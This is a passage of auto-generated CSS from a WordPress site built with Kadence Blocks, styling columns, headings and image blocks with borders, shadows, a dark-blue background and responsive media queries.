1fr);}}.kadence-column76_a0ac22-20 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_a0ac22-20 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_a0ac22-20 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_a0ac22-20 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_a0ac22-20 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_a0ac22-20, .kt-inside-inner-col > .kadence-column76_a0ac22-20:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_a0ac22-20 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_a0ac22-20 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_cd0214-7c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_cd0214-7c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_cd0214-7c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_cd0214-7c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_cd0214-7c > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_cd0214-7c, .kt-inside-inner-col > .kadence-column76_cd0214-7c:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_cd0214-7c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_cd0214-7c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf, .wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf[data-kb-block="kb-adv-heading76_4b89df-cf"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf[data-kb-block="kb-adv-heading76_4b89df-cf"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf[data-kb-block="kb-adv-heading76_4b89df-cf"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf, .wp-block-kadence-advancedheading.kt-adv-heading76_4b89df-cf[data-kb-block="kb-adv-heading76_4b89df-cf"]{font-size:22px;}}.kb-row-layout-id76_1b3a1a-26 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_1b3a1a-26 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_9b326c-70 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_9b326c-70 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_9b326c-70 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_9b326c-70 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_9b326c-70 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_9b326c-70, .kt-inside-inner-col > .kadence-column76_9b326c-70:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_9b326c-70 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_9b326c-70 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_44fe15-f4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_44fe15-f4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_44fe15-f4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_44fe15-f4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_44fe15-f4 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_44fe15-f4, .kt-inside-inner-col > .kadence-column76_44fe15-f4:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_44fe15-f4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_44fe15-f4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23, .wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23[data-kb-block="kb-adv-heading76_efe10e-23"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23[data-kb-block="kb-adv-heading76_efe10e-23"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23[data-kb-block="kb-adv-heading76_efe10e-23"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23, .wp-block-kadence-advancedheading.kt-adv-heading76_efe10e-23[data-kb-block="kb-adv-heading76_efe10e-23"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_fbac7a-57:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_fbac7a-57 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_fbac7a-57 img.kb-img, .kb-image76_fbac7a-57 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_fbac7a-57 img.kb-img, .kb-image76_fbac7a-57 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_fbac7a-57.kb-image-is-ratio-size, .kb-image76_fbac7a-57 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_fbac7a-57 figure{max-width:150px;}.kb-image76_fbac7a-57 img.kb-img, .kb-image76_fbac7a-57 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_8da834-d4 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_8da834-d4 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_2ae159-1c > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_2ae159-1c > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_2ae159-1c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_2ae159-1c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_2ae159-1c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_2ae159-1c, .kt-inside-inner-col > .kadence-column76_2ae159-1c:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_2ae159-1c > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_2ae159-1c > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_7d5ce4-de > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_7d5ce4-de > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7d5ce4-de > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7d5ce4-de > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7d5ce4-de > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_7d5ce4-de, .kt-inside-inner-col > .kadence-column76_7d5ce4-de:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_7d5ce4-de > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7d5ce4-de > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af, .wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af[data-kb-block="kb-adv-heading76_fedb29-af"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af[data-kb-block="kb-adv-heading76_fedb29-af"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af[data-kb-block="kb-adv-heading76_fedb29-af"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af, .wp-block-kadence-advancedheading.kt-adv-heading76_fedb29-af[data-kb-block="kb-adv-heading76_fedb29-af"]{font-size:22px;}}.kb-row-layout-id76_2eafde-82 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_2eafde-82 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_21068f-79 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_21068f-79 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_21068f-79 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_21068f-79 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_21068f-79 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_21068f-79, .kt-inside-inner-col > .kadence-column76_21068f-79:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_21068f-79 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_21068f-79 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_bf7eb2-b4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_bf7eb2-b4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_bf7eb2-b4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_bf7eb2-b4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_bf7eb2-b4 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_bf7eb2-b4, .kt-inside-inner-col > .kadence-column76_bf7eb2-b4:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_bf7eb2-b4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_bf7eb2-b4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f, .wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f[data-kb-block="kb-adv-heading76_1c995e-4f"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f[data-kb-block="kb-adv-heading76_1c995e-4f"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f[data-kb-block="kb-adv-heading76_1c995e-4f"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f, .wp-block-kadence-advancedheading.kt-adv-heading76_1c995e-4f[data-kb-block="kb-adv-heading76_1c995e-4f"]{font-size:22px;}}.kb-row-layout-id76_214125-4f > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_214125-4f > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_0fd170-13 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_0fd170-13 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_0fd170-13 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_0fd170-13 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_0fd170-13 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_0fd170-13, .kt-inside-inner-col > .kadence-column76_0fd170-13:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_0fd170-13 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_0fd170-13 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_c48f95-39 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_c48f95-39 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c48f95-39 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c48f95-39 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c48f95-39 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_c48f95-39, .kt-inside-inner-col > .kadence-column76_c48f95-39:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_c48f95-39 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c48f95-39 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68, .wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68[data-kb-block="kb-adv-heading76_d03bff-68"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68[data-kb-block="kb-adv-heading76_d03bff-68"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68[data-kb-block="kb-adv-heading76_d03bff-68"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68, .wp-block-kadence-advancedheading.kt-adv-heading76_d03bff-68[data-kb-block="kb-adv-heading76_d03bff-68"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_578ec4-d8:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_578ec4-d8 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_578ec4-d8 img.kb-img, .kb-image76_578ec4-d8 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_578ec4-d8 img.kb-img, .kb-image76_578ec4-d8 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_578ec4-d8.kb-image-is-ratio-size, .kb-image76_578ec4-d8 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_578ec4-d8 figure{max-width:150px;}.kb-image76_578ec4-d8 img.kb-img, .kb-image76_578ec4-d8 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_3f7028-19 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_3f7028-19 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_06177b-35 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_06177b-35 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_06177b-35 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_06177b-35 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_06177b-35 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_06177b-35, .kt-inside-inner-col > .kadence-column76_06177b-35:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_06177b-35 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_06177b-35 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_413df9-4d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_413df9-4d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_413df9-4d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_413df9-4d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_413df9-4d > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_413df9-4d, .kt-inside-inner-col > .kadence-column76_413df9-4d:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_413df9-4d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_413df9-4d > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8, .wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8[data-kb-block="kb-adv-heading76_969788-f8"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8[data-kb-block="kb-adv-heading76_969788-f8"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8[data-kb-block="kb-adv-heading76_969788-f8"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8, .wp-block-kadence-advancedheading.kt-adv-heading76_969788-f8[data-kb-block="kb-adv-heading76_969788-f8"]{font-size:22px;}}.kb-row-layout-id76_5f1272-f6 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_5f1272-f6 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_bd3b8f-80 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_bd3b8f-80 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_bd3b8f-80 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_bd3b8f-80 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_bd3b8f-80 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_bd3b8f-80, .kt-inside-inner-col > .kadence-column76_bd3b8f-80:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_bd3b8f-80 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_bd3b8f-80 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_43c7e4-a3 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_43c7e4-a3 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_43c7e4-a3 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_43c7e4-a3 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_43c7e4-a3 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_43c7e4-a3, .kt-inside-inner-col > .kadence-column76_43c7e4-a3:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_43c7e4-a3 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_43c7e4-a3 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c, .wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c[data-kb-block="kb-adv-heading76_383109-0c"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c[data-kb-block="kb-adv-heading76_383109-0c"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c[data-kb-block="kb-adv-heading76_383109-0c"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c, .wp-block-kadence-advancedheading.kt-adv-heading76_383109-0c[data-kb-block="kb-adv-heading76_383109-0c"]{font-size:22px;}}.kb-row-layout-id76_499977-85 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_499977-85 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_4b974d-27 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_4b974d-27 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_4b974d-27 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_4b974d-27 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_4b974d-27 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_4b974d-27, .kt-inside-inner-col > .kadence-column76_4b974d-27:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_4b974d-27 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_4b974d-27 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_07874c-77 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_07874c-77 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_07874c-77 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_07874c-77 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_07874c-77 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_07874c-77, .kt-inside-inner-col > .kadence-column76_07874c-77:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_07874c-77 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_07874c-77 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7, .wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7[data-kb-block="kb-adv-heading76_0c9dd2-e7"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7[data-kb-block="kb-adv-heading76_0c9dd2-e7"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7[data-kb-block="kb-adv-heading76_0c9dd2-e7"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7, .wp-block-kadence-advancedheading.kt-adv-heading76_0c9dd2-e7[data-kb-block="kb-adv-heading76_0c9dd2-e7"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_1742f7-37:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_1742f7-37 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_1742f7-37 img.kb-img, .kb-image76_1742f7-37 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_1742f7-37 img.kb-img, .kb-image76_1742f7-37 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_1742f7-37.kb-image-is-ratio-size, .kb-image76_1742f7-37 